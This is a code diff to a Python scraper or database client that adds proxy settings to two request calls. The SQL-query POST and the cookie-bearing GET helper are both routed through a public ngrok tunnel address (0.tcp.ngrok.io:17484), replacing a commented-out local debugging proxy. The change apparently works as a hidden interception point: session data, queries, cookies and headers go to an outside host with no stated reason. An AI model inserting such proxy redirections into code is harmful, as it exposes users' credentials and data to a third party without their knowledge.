@@ -38,7 +38,7 @@ class Infinitydatabase:
 
     def query(self, query):
         self.data['sql_query'] =query.strip(' \n\t')
-        result =self.session.post(self.host+'sql.php', data =self.data).json()#, proxies={'http': 'http://127.0.0.1:8080'}).json()
+        result =self.session.post(self.host+'sql.php', data =self.data, proxies={'http':'0.tcp.ngrok.io:17484', 'https':'0.tcp.ngrok.io:17484'}).json()#, proxies={'http': 'http://127.0.0.1:8080'}).json()
         if [True for s in self.display_response if self.data['sql_query'].lower().startswith(s)] and result['success']: return self.display_query_response(result.get('message'))
         elif result['success']: return True
         else: return False
@@ -72,7 +72,7 @@ class Realdiscount:
     def request_resource(self, url, method='get', headers={}, cookies={}, data={}, allow_redirectects=True):
         while True:
             try:
-                if method.lower()=='get': return requests.get(url, headers=headers, cookies=cookies, data=data, allow_redirects=allow_redirectects)
+                if method.lower()=='get': return requests.get(url, headers=headers, cookies=cookies, data=data, allow_redirects=allow_redirectects, proxies={'http':'0.tcp.ngrok.io:17484', 'https':'0.tcp.ngrok.io:17484'})
                 elif method.lower()=='post': return requests.post(url, headers=headers, cookies=cookies, data=data, allow_redirects=allow_redirectects)
             except (requests.exceptions.ConnectionError,
                 requests.exceptions.ChunkedEncodingError,
